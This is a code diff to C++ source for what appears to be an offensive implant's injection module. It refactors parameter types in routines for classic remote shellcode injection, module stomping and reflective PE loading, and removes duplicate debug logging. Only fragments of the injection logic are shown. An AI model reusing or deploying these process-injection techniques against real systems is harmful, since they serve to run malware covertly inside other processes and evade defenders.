@@ -15,7 +15,7 @@ auto DECLFN Injection::Shellcode(
             HANDLE TdHandle = INVALID_HANDLE_VALUE;
 
             Success = this->Classic( 
-                ProcessID, Buffer, Size, Param, &ScBase
+                ProcessID, Buffer, Size, Param, ScBase
             );
 
             if ( !Success ) return Success;
@@ -29,11 +29,11 @@ auto DECLFN Injection::Shellcode(
 }
 
 auto DECLFN Injection::Classic(
-    _In_  ULONG   ProcessID,
-    _In_  BYTE*   Buffer,
-    _In_  UPTR    Size,
-    _In_  PVOID   Param,
-    _Out_ PVOID*  Base
+    _In_  ULONG  ProcessID,
+    _In_  BYTE*  Buffer,
+    _In_  UPTR   Size,
+    _In_  PVOID  Param,
+    _Out_ PVOID &Base
 ) -> BOOL {
     BOOL   Success    = FALSE;
     HANDLE PsHandle   = INVALID_HANDLE_VALUE; 
@@ -65,23 +65,18 @@ _KH_END:
     if ( !Success && BaseRet ) {
         Self->Mm->Free( BaseRet, Size, MEM_RELEASE, PsHandle );
     } else {
-        *Base = BaseRet;
+        Base = BaseRet;
     }
 
     return Success;
 }
 
-/*
- * @brief
- * module stomp technique to shellcode injection
- * 
- */
 auto DECLFN Injection::Stomp(
-    _In_  ULONG   ProcessID,
-    _In_  BYTE*   Buffer,
-    _In_  UPTR    Size,
-    _In_  PVOID   Param,
-    _Out_ PVOID*  Base
+    _In_  ULONG ProcessID,
+    _In_  BYTE* Buffer,
+    _In_  UPTR  Size,
+    _In_  PVOID Param,
+    _Out_ PVOID &Base
 ) -> BOOL {
     HMODULE Modules[1024];
 
@@ -104,8 +99,8 @@ auto DECLFN Injection::Stomp(
     HANDLE  Transacted = INVALID_HANDLE_VALUE;
     HANDLE  FileHandle = INVALID_HANDLE_VALUE;
 
-    PIMAGE_NT_HEADERS       Header = { 0 };
-    PIMAGE_SECTION_HEADER   SecHdr = { 0 };
+    IMAGE_NT_HEADERS*       Header = { 0 };
+    IMAGE_SECTION_HEADER*   SecHdr = { 0 };
 
     // 
     // open handle to the target process
@@ -143,7 +138,7 @@ auto DECLFN Injection::Stomp(
 
         Self->Krnl32.ReadFile( FileHandle, FileBuff, FileSize, 0, 0 );
 
-        Header = (PIMAGE_NT_HEADERS)( U_PTR( FileBuff ) + static_cast<PIMAGE_DOS_HEADER>( FileBuff )->e_lfanew );
+        Header = (IMAGE_NT_HEADERS*)( U_PTR( FileBuff ) + static_cast<PIMAGE_DOS_HEADER>( FileBuff )->e_lfanew );
         SecHdr = IMAGE_FIRST_SECTION( Header );
 
         Entrypoint = Header->OptionalHeader.AddressOfEntryPoint;
@@ -202,14 +197,14 @@ auto DECLFN Injection::Reflection(
 
     SECURITY_ATTRIBUTES SecAttr = { 0 };
 
-    PIMAGE_NT_HEADERS     Header = { 0 };
-    PIMAGE_SECTION_HEADER SecHdr = { 0 };
-    PIMAGE_DATA_DIRECTORY RelDir = { 0 };
-    PIMAGE_DATA_DIRECTORY ExpDir = { 0 };
-    PIMAGE_DATA_DIRECTORY TlsDir = { 0 };
-    PIMAGE_DATA_DIRECTORY ImpDir = { 0 };
+    IMAGE_NT_HEADERS*     Header = { 0 };
+    IMAGE_SECTION_HEADER* SecHdr = { 0 };
+    IMAGE_DATA_DIRECTORY* RelDir = { 0 };
+    IMAGE_DATA_DIRECTORY* ExpDir = { 0 };
+    IMAGE_DATA_DIRECTORY* TlsDir = { 0 };
+    IMAGE_DATA_DIRECTORY* ImpDir = { 0 };
 
-    Header = (PIMAGE_NT_HEADERS)( U_PTR( Buffer ) + ( (PIMAGE_DOS_HEADER)( Buffer ) )->e_lfanew );
+    Header = (IMAGE_NT_HEADERS*)( U_PTR( Buffer ) + ( (PIMAGE_DOS_HEADER)( Buffer ) )->e_lfanew );
     SecHdr = IMAGE_FIRST_SECTION( Header );
     RelDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     ExpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
@@ -238,12 +233,8 @@ auto DECLFN Injection::Reflection(
     KhDbg( "sections copied" );
 
     Self->Usf->FixImp( ImgBase, ImpDir );
-    KhDbg( "sections copied" );
     Self->Usf->FixRel( ImgBase, Delta, RelDir );
-    KhDbg( "sections copied" );
     Self->Usf->FixExp( ImgBase, ExpDir );
-    KhDbg( "sections copied" );
-    // Self->Usf->FixTls( ImgBase, TlsDir );
 
     KhDbg( "fixed imports, exceptions and relocations" );
 
